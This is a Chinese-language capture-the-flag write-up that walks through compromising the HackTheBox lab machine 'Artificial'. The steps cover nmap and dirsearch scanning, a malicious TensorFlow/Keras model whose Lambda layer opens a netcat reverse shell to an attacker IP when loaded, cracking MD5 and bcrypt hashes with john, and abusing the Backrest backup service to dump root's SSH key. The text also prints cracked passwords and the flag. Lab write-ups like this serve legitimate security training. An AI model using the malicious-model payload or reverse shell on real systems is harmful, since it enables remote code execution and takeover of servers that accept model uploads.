## 扫描
```BASH
┌──(kali㉿kali)-[~/Desktop/htb/Artificial]
└─$ nmap -sV -A 10.10.11.74 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 03:43 EDT
Nmap scan report for 10.10.11.74
Host is up (1.3s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   792.77 ms 10.10.16.1
2   379.06 ms 10.10.11.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.04 seconds

```

dirsearch
```bash
dirsearch -u http://artificial.htb/ -t 20 -e php,html,js,txt,zip,bak -x 404,403,500
[04:31:06] 302 -  199B  - /dashboard  ->  /login                            
[04:34:07] 200 -  857B  - /login                                            
[04:34:14] 302 -  189B  - /logout  ->  /                                    
[04:36:39] 200 -  952B  - /register                   
```

注册登陆后存在上传界面

![](attachments/Pasted%20image%2020250911164641.png)

按照给定的dockerfile在本地构建，然后构造恶意模型，这里解决下载问题将curl换为copy
```DOCKERFILE
FROM python:3.8-slim

WORKDIR /code

COPY tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl ./

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]

```

生成恶意模型
```PYTHON
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.64 23456 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```
生成后上传模型拿shell
![](attachments/Pasted%20image%2020250911172733.png)


与[CodePartTwo](CodePartTwo.md)思路类似拿db文件爆破密码

![](attachments/Pasted%20image%2020250911215312.png)

john爆破
```SHELL
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-md5                                    
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
mattp005numbertwo (?)     
1g 0:00:00:01 DONE (2025-09-11 10:00) 0.8264g/s 4728Kp/s 4728Kc/s 4728KC/s mattpapa..mattne
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

登陆后发现目录下存在备份文件

![](attachments/Pasted%20image%2020250911220810.png)
对可以读取的文件进行读取

```BASH
gael@artificial:/var/backups$ cat /opt/backrest/install.sh 
#! /bin/bash

cd "$(dirname "$0")" # cd to the directory of this script

install_or_update_unix() {
  if systemctl is-active --quiet backrest; then
    sudo systemctl stop backrest
    echo "Paused backrest for update"
  fi
  install_unix
}

install_unix() {
  echo "Installing backrest to /usr/local/bin"
  sudo mkdir -p /usr/local/bin

  sudo cp $(ls -1 backrest | head -n 1) /usr/local/bin
}

create_systemd_service() {
  if [ ! -d /etc/systemd/system ]; then
    echo "Systemd not found. This script is only for systemd based systems."
    exit 1
  fi

  if [ -f /etc/systemd/system/backrest.service ]; then
    echo "Systemd unit already exists. Skipping creation."
    return 0
  fi

  echo "Creating systemd service at /etc/systemd/system/backrest.service"

  sudo tee /etc/systemd/system/backrest.service > /dev/null <<- EOM
[Unit]
Description=Backrest Service
After=network.target

[Service]
Type=simple
User=$(whoami)
Group=$(whoami)
ExecStart=/usr/local/bin/backrest
Environment="BACKREST_PORT=127.0.0.1:9898"
Environment="BACKREST_CONFIG=/opt/backrest/.config/backrest/config.json"
Environment="BACKREST_DATA=/opt/backrest"
Environment="BACKREST_RESTIC_COMMAND=/opt/backrest/restic"

[Install]
WantedBy=multi-user.target
EOM

  echo "Reloading systemd daemon"
  sudo systemctl daemon-reload
}

create_launchd_plist() {
  echo "Creating launchd plist at /Library/LaunchAgents/com.backrest.plist"

  sudo tee /Library/LaunchAgents/com.backrest.plist > /dev/null <<- EOM
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.backrest</string>
    <key>ProgramArguments</key>
    <array>
    <string>/usr/local/bin/backrest</string>
    </array>
    <key>KeepAlive</key>
    <true/>
    <key>EnvironmentVariables</key>
    <dict>
        <key>PATH</key>
        <string>/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</string>
        <key>BACKREST_PORT</key>
        <string>127.0.0.1:9898</string>
    </dict>
</dict>
</plist>
EOM
}
```
应该是存在不对外服务，查看端口
```BASH
$ ss -tuln
Netid      State       Recv-Q      Send-Q           Local Address:Port           Peer Address:Port     Process      
udp        UNCONN      0           0                127.0.0.53%lo:53                  0.0.0.0:*                     
tcp        LISTEN      0           2048                 127.0.0.1:5000                0.0.0.0:*                     
tcp        LISTEN      0           4096                 127.0.0.1:9898                0.0.0.0:*                     
tcp        LISTEN      0           5                      0.0.0.0:9999                0.0.0.0:*                     
tcp        LISTEN      0           511                    0.0.0.0:80                  0.0.0.0:*                     
tcp        LISTEN      0           4096             127.0.0.53%lo:53                  0.0.0.0:*                     
tcp        LISTEN      0           128                    0.0.0.0:22                  0.0.0.0:*                     
tcp        LISTEN      0           5                      0.0.0.0:8000                0.0.0.0:*                     
tcp        LISTEN      0           511                       [::]:80                     [::]:*                     
tcp        LISTEN      0           128                       [::]:22                     [::]:*    
```
转发端口
```shell
ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898
```
备份文件的位置在
```
gael@artificial:/var/backups$ ll
total 51972
drwxr-xr-x  2 root root       4096 Sep 11 06:25 ./
drwxr-xr-x 13 root root       4096 Jun  2 07:38 ../
-rw-r--r--  1 root root      51200 Sep 11 06:25 alternatives.tar.0
-rw-r--r--  1 root root      38602 Jun  9 10:48 apt.extended_states.0
-rw-r--r--  1 root root       4253 Jun  9 09:02 apt.extended_states.1.gz
-rw-r--r--  1 root root       4206 Jun  2 07:42 apt.extended_states.2.gz
-rw-r--r--  1 root root       4190 May 27 13:07 apt.extended_states.3.gz
-rw-r--r--  1 root root       4383 Oct 27  2024 apt.extended_states.4.gz
-rw-r--r--  1 root root       4379 Oct 19  2024 apt.extended_states.5.gz
-rw-r--r--  1 root root       4367 Oct 14  2024 apt.extended_states.6.gz
-rw-r-----  1 root sysadm 52357120 Mar  4  2025 backrest_backup.tar.gz
-rw-r--r--  1 root root        268 Sep  5  2024 dpkg.diversions.0
-rw-r--r--  1 root root        135 Sep 14  2024 dpkg.statoverride.0
-rw-r--r--  1 root root     696841 Jun  9 10:48 dpkg.status.0
```

通过解压文件找到配置文件

```JSON
gael@artificial:~/1/backrest/.config/backrest$ cat config.json 
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}

```

john做bcrypt破解

```BASH
ohn --wordlist=/usr/share/wordlists/rockyou.txt ./bcrypt.txt --format=bcrypt                                 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
!@#$%^           (?)     
1g 0:00:01:28 DONE (2025-09-11 11:12) 0.01135g/s 61.32p/s 61.32c/s 61.32C/s baby16..huevos
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

登陆仓库用密码
![](attachments/Pasted%20image%2020250911232100.png)

就可以按照先前的备份，创建仓库然后备份root文件夹

![](attachments/Pasted%20image%2020250911232625.png)

![](attachments/Pasted%20image%2020250911232809.png)

导出root密钥
```none
dump 29c0b14d /root/.ssh/id_rsa
```

>SSH 协议要求私钥文件必须严格保护。如果权限过于宽松,会拒绝使用需要chmod

```SHELL
chmod 600 ./id_rsa
ssh -i ./id_rsa root@10.10.11.74 
root@artificial:~# cat root.txt 
baa1eccf9cdc7b222433e13714404c42
```
## 参考文章
https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model

